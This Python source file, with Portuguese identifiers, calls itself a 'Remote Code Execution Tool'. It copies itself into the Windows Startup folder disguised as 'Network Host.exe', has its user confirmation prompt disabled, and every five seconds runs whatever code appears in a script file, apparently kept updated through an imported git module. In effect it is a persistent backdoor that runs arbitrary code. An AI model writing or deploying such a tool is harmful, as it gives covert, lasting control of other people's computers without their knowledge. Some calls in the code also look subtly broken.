from git import *

import os
import sys
import ctypes
import shutil
import threading
import traceback

import time
from datetime import datetime


APP_NOME = "Remote Code Execution Tool [RCET]"
APP_VERSAO = "1.1.0"

ARQUIVO_NOME = "Network Host"

AVISAR = False


username = os.environ.get("USERNAME")

caminho_script = "Users/" + username + "/script.py"
caminho_log = "Users/" + username + "/log.txt"
caminho_info = "Users/" + username + "/info.json"


caminho_completo = ""
script = ""

tempo = 5.0

logs = 0


def main():
	print(APP_NOME + " [v" + APP_VERSAO + "] carregado com sucesso")
	
	adicionar_ao_startup()

	log_mensagem = APP_NOME + " iniciado" + \
		"\nVersão: " + APP_VERSAO + \
		"\nDelay do temporizador: " + str(tempo) + "s"
	log_criado = False
	
	if get_sha(caminho_log):
		criar_log(log_mensagem)
		log_criado = True

	criar_arquivos_de_usuario(False)

	if not log_criado:
		criar_log(log_mensagem)
		log_criado = True

	criar_timer()


def aviso():
	resposta = ctypes.windll.user32.MessageBoxW(
		0,
		"Deseja continuar?",
		"Confirmação",
		4
	)

	if resposta == 6:
		main()
	elif resposta == 7:
		sys.exit()


def adicionar_ao_startup():
	origem = ""
	if getattr(sys, 'frozen', False):
		origem = sys.executable
	else:
		origem = os.path.abspath(__file__)

	destino = "C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + ARQUIVO_NOME + ".exe"

	shutil.copy2(origem, destino)

	criar_log("Arquivo copiado de '" + origem + "' para '" + destino + "'")


def criar_arquivos_de_usuario(reset):
	if reset:
		deletar_arquivo(username)

	criar_arquivo(caminho_script, "", False)
	criar_arquivo(caminho_log, "", False)
	criar_arquivo(caminho_info, "", False)


def criar_log(log):
	global logs

	conteudo_inicial = ler_arquivo(caminho_log)

	if logs <= 0:
		conteudo_inicial = "\n\n\n=====================================================================\n" + conteudo_inicial

	unix = datetime.now().timestamp()
	timestamp = "[" + str(datetime.fromtimestamp(unix)) + "] "

	conteudo = timestamp + log
	conteudo = "\n\n" + conteudo + conteudo_inicial

	criar_arquivo(caminho_log, conteudo, True)
	print(timestamp + log)

	logs += 1


def criar_timer():
	timer = threading.Timer(tempo, executar_arquivo_de_usuario)
	timer.start()


def executar_arquivo_de_usuario():
	conteudo = ler_arquivo(caminho_script)

	global script
	if script != conteudo:
		script = conteudo
		criar_log("Script atualizado:\n" + script)

	try:
		exec(conteudo, globals())
	except Exception as erro:
		criar_log("Erro ao executar script:\n{" +
			"\tTipo: " + str(type(erro).__name__) + "\n" + 
			"\tMensagem: " + str(erro) + "\n" + 
			"\tTraceback: " + str(traceback.print_exc()) + "\n" + 
		"}")
	
	if "execucao_unica = true" in script:
		criar_arquivo(caminho_script, "")

	criar_timer()


if AVISAR:
	aviso()
else:
	main()